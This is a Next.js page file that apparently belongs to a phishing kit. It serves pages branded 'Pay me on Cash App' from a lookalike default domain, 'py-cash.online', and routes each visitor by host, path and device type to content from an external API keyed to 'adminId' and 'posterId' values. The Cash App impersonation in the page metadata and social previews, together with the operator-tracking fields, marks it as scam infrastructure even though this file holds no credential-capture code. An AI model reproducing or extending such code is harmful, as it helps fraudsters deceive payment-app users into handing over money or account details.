import Home from "@/app/components/Home";
import { site, API_URL } from "@/app/config/index";
import { headers } from "next/headers";

export async function generateMetadata({ params }) {
  const { param } = params;
  const headersList = headers();
  const host = headersList.get("host") || "py-cash.online";

  return {
    metadataBase: new URL(`https://${host}`),
    title: param || "Cash App",
    description: `Pay me on Cash App — Instantly exchange money for free on Cash App`,
    openGraph: {
      title: param || "Cash App",
      description: `Pay me on Cash App — Instantly exchange money for free on Cash App`,
      type: "website",
      url: `/${param}`,
      images: [
        {
          url: `/${param}/opengraph-image`,
          width: 1200,
          height: 630,
          alt: "Pay on Cash App",
        },
      ],
    },
    twitter: {
      card: "summary_large_image",
      title: param || "Cash App",
      description: `Pay me on Cash App — Instantly exchange money for free on Cash App`,
      images: [`/${param}/opengraph-image`],
    },
  };
}

export default async function page({ params }) {
  const { param } = params;

  const headersList = headers();
  const userAgent = headersList.get("user-agent") || "";

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";
  const host = (headersList.get("host") || site || "").replace(/^www\./, "");

  // Dynamic URL with site name, param, and device
  const url = `${API_URL}/${host || site}/${param}/${device}`;

  try {
    const res = await fetch(url);
    const data = await res.json();

    if (data?.success === "exists") {
      return (
        <Home
          adminId={data.adminId}
          posterId={data.posterId}
          param={param}
          param2=""
          linkConfig={data.link}
        />
      );
    }
  } catch (error) {
    console.error("Error fetching single param dynamic page data:", error);
  }

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50">
      <div className="text-xl font-bold text-gray-400">No Page found!!</div>
    </div>
  );
}
